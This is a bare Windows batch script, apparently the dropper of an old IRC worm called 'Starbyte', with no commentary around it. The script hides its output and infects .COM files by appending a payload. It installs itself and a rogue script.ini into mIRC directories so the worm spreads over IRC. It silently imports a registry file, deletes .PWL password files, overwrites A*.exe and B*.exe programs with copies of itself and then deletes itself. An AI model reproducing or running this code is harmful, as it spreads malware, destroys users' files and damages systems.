@ECHO off
Ctty nul
Move C:\REG.REG %WINDIR%\REG.REG
for %%i In (*.COM ..\*.COM) do copy /b %%i + c:\Starbyte\x.xxx %%i
IF EXIST c:\mIRC\*.* GOTO :1
IF NOT EXIST C:\mIRC\*.* GOTO :2
:1
MOVE c:\Starbyte\Starbyte.exe C:\mIRC\Starbyte.exe
MOVE c:\Starbyte\sc.ini C:\mIRC\Script.ini
GOTO :next
:2
IF EXIST C:\Progra~1\mIRC\*.* GOTO :3
IF NOT EXIST C:\Progra~1\mIRC\*.* GOTO :next
:3
MOVE c:\Starbyte\Starbyte.exe C:\Progra~1\mIRC\Starbyte.exe
MOVE c:\Starbyte\sc.ini C:\Progra~1\mIRC\Script.ini
GOTO :next
:next
IF EXIST IO.SYS GOTO :X
IF NOT EXIST IO.SYS GOTO :Z
:Z
@REGEDIT /S /C %WINDIR%\REG.REG
GOTO :X
:X
for %%i in (%WINDIR%\*.PWL) do DEL %%i
for %%i in (B*.exe,A*.exe) do copy starbyte.bat %%i
for %%i in (c:\Starbyte\*.*) do del %%i
RD c:\Starbyte
del %0
